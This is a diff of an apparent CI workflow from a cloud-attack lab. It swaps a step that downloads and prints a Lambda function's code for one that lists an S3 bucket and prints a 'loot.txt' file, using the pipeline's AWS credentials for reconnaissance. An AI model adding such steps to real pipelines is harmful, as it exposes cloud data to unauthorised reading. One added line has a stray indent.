@@ -30,26 +30,13 @@ jobs:
           aws lambda get-function-configuration \
             --function-name nslookupv2
 
-      - name: Download Lambda code
-        run: |
-          echo "===== DOWNLOAD LAMBDA ====="
+      - name: Check loot file
+         run: |
+          echo "===== S3 CONTENT ====="
+          aws s3 ls s3://codec4f26c862a321ef5/
 
-          aws lambda get-function \
-            --function-name nslookupv2 \
-            --query 'Code.Location' \
-            --output text > lambda_url
-
-          mkdir lambda
-
-          curl -L "$(cat lambda_url)" -o lambda.zip
-
-          unzip -o lambda.zip -d lambda
-
-          echo "===== FILES ====="
-          find lambda -type f
-
-          echo "===== CODE ====="
-          cat lambda/lambda_function.py
+          echo "===== LOOT CONTENT ====="
+          aws s3 cp s3://codec4f26c862a321ef5/loot.txt -
 
       - name: Lambda role permissions
         run: |
